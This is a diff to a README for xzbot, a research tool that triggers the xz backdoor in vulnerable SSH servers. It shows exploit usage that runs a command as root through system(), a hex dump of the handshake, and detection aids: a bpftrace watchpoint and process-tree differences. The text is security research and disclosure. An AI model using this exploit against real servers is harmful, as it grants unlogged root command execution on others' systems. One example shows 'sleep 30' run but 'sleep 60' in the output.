@@ -121,8 +121,12 @@ Usage of xzbot:
         ed448 seed, must match xz backdoor key (default "0")
   -cmd string
         command to run via system() (default "id > /tmp/.xz")
+```
 
-$ xzbot -addr 127.0.0.1:2222
+The following will connect to a vulnerable SSH server at `127.0.0.1:2222` and
+run the command `id > /tmp/.xz`:
+```
+$ xzbot -addr 127.0.0.1:2222 -cmd 'id > /tmp/.xz'
 00000000  00 00 00 1c 73 73 68 2d  72 73 61 2d 63 65 72 74  |....ssh-rsa-cert|
 00000010  2d 76 30 31 40 6f 70 65  6e 73 73 68 2e 63 6f 6d  |-v01@openssh.com|
 00000020  00 00 00 00 00 00 00 03  01 00 01 00 00 01 01 01  |................|
@@ -148,6 +152,8 @@ $ xzbot -addr 127.0.0.1:2222
 2024/03/30 00:00:00 ssh: handshake failed: EOF
 ```
 
+On the vulnerable server, we can set a watchpoint for the call to `system()`
+and observe the command is executed:
 ```
 $ bpftrace -e 'watchpoint:0x07FFFF74B1995:8:x {
     printf("%s (%d): %s\n", comm, pid, str(uptr(reg("di"))))
@@ -159,7 +165,25 @@ $ cat /tmp/.xz
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-*Note: successful exploitation does not generate any log entries.*
+The process tree after exploitation looks different from a normal sshd
+process tree:
+```
+# normal process tree
+$ ssh foo@bar
+$ ps -ef --forest
+root         931     765  1 18:04 ?        00:00:00  \_ sshd: root@pts/1
+root         938     931  0 18:04 pts/1    00:00:00      \_ -bash
+
+# backdoor process tree
+$ xzbot -cmd 'sleep 30'
+$ ps -ef --forest
+root         941     765  4 18:04 ?        00:00:00  \_ sshd: root [priv]
+sshd         942     941  0 18:04 ?        00:00:00      \_ sshd: root [net]
+root         943     941  0 18:04 ?        00:00:00      \_ sh -c sleep 60
+root         944     943  0 18:04 ?        00:00:00          \_ sleep 60
+```
+
+*Note: successful exploitation does not generate any INFO or higher log entries.*
 
 # References
 
